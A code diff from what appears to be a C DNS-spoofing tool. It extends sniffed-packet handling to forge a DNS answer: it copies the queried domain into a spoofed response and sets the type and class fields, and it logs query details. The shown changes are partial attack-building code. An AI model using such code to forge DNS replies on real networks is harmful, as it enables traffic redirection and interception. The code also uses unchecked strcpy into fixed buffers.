@@ -52,9 +52,20 @@ struct dns_header {
 };
 
 struct dns_query {
-	u_char *qname;
-	u_short qtype;
-	u_short qclass;
+	u_short type;
+	u_short class;
+};
+
+struct dns_answer_data {
+	u_short type;
+	u_short class;
+};
+
+struct dns_answer {
+	u_char name[10000];
+	u_char separator;
+	u_short type;
+	u_short class;
 };
 
 #define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
@@ -250,23 +261,45 @@ void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *si
 				spoofed_dns_header->nscount = dns->nscount;
 				spoofed_dns_header->arcount = dns->arcount;
 
+				// Forging the DNS Answer
+
+				// Copying the domain name
 				char name1[100000];
 				memset(name1, '\0', sizeof(name1));
-				char *query = (char*)(packet + SIZE_ETHERNET + size_ip + sizeof(struct udphdr) + sizeof(struct dns_header*));
-				strcpy(name1, query);
+				char *domain = (char*)(packet + SIZE_ETHERNET + size_ip + sizeof(struct udphdr) + sizeof(struct dns_header));
+
+				struct dns_answer* spoofed_dns_answer = (struct dns_answer*)(datagram + size_ip + sizeof(struct udphdr) + sizeof(struct dns_header));
+				//spoofed_dns_answer->name = (u_char*)malloc(strlen(domain)*sizeof(char));
+				strcpy((char*)spoofed_dns_answer->name, (const char*)domain);
+
+				const struct dns_query *query;
+				query = (struct dns_query*)(packet + SIZE_ETHERNET + size_ip + sizeof(struct udphdr) + sizeof(struct dns_header) \
+										 + strlen(domain) + 1);
+
+
+				// Copying the null terminator for end of the domain and also copying the type and class fields
+				spoofed_dns_answer->separator = 0;
+				spoofed_dns_answer->type = query->type;
+				spoofed_dns_answer->class = query->class;
+
 				sprintf(args + strlen(args), " %s:%d ->", inet_ntoa(ip->ip_src), ntohs(udp->uh_sport));
 				sprintf(args + strlen(args), " %s:%d ", inet_ntoa(ip->ip_dst), ntohs(udp->uh_dport));
 
 				if (stringExpression == NULL || ((*size_payload > 0) && strstr((char*)*payload, (char*)stringExpression))){
 					sprintf(args + strlen(args), " IP_length in hex %d", size_of_forged_dns_response);
 					sprintf(args + strlen(args), " Payload (%d bytes):", *size_payload);
-					sprintf(args + strlen(args), " Lengh of qname is %lu bytes", strlen(name1));
+					sprintf(args + strlen(args), " Query Type %d Query Class %d ", query->type, query->class);
 					printf("%s\n", args);
 					print_payload(*payload, *size_payload);
 					printf("Response Start\n");
 					u_char *pay1 = (u_char*)datagram;
-					print_payload(pay1, sizeof(struct sniff_ip) + sizeof(struct udphdr) + sizeof(struct dns_header));
+					print_payload(pay1, sizeof(struct sniff_ip) + sizeof(struct udphdr) + sizeof(struct dns_header) \
+						+ strlen(domain) + 1 + sizeof(struct dns_answer_data));
 					printf("Response End\n");
+					printf("Query Start\n");
+					pay1 = (u_char*)query;
+					print_payload(pay1, 4);
+					printf("Query End\n");
 				}
 			}
 			break;
